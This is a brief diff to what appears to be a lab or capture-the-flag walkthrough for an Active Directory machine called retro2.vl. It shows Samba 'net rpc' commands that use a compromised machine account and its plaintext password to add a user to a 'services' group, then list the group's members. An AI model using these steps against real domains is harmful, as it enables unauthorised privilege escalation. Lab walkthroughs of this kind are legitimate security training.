@@ -354,6 +354,12 @@ net rpc group addmem "services" "ldapreader" -U "retro2.vl"/"admws01$"%'dmuhacke
 This added the user `ldapreader` to the services group
 
 ```python
+net rpc group members "services" -U "retro2.vl"/"admws01$"%'dmuhackers123!' -S "10.129.12.5" 
+RETRO2\ADMWS01$
+RETRO2\inventory
+RETRO2\ldapreader
+
 
 ```
+
 
